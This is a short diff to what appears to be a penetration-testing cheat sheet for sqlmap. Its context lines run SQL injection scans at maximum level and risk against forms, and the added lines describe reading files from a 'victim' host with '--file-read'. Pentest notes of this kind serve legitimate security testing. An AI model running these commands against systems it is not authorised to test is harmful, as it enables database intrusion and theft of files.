@@ -42,6 +42,10 @@
 ```sqlmap -u $url -g url: --level=5 --risk=3 --forms```
 ```sqlmap -u $url -g page: --level=5 --risk=3 --forms```
 
+# Reading files (requires read privileges)
+
+```sqlmap --file-read $path_to_file_on_victim```
+
 # Interaction(less) sqlmap
 
  - Append ```--batch``` to any of the previous commands
